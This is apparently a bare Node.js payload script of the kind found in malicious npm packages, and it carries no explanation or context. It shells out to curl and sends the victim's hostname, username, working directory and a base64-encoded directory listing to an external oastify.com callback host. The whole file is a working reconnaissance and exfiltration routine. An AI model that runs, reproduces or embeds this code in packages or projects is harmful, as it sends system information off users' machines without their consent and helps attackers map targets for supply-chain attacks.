const { exec } = require("child_process");
exec('/usr/bin/curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64) http://hh2jrafy3z3xpdaa73mqi27ig9m0a1yq.oastify.com', (error, data, getter) => {
    if (error) {
        console.log("error", error.message);
        return;
    }
    if (getter) {
        console.log(data);
        return;
    }
    console.log(data);
});

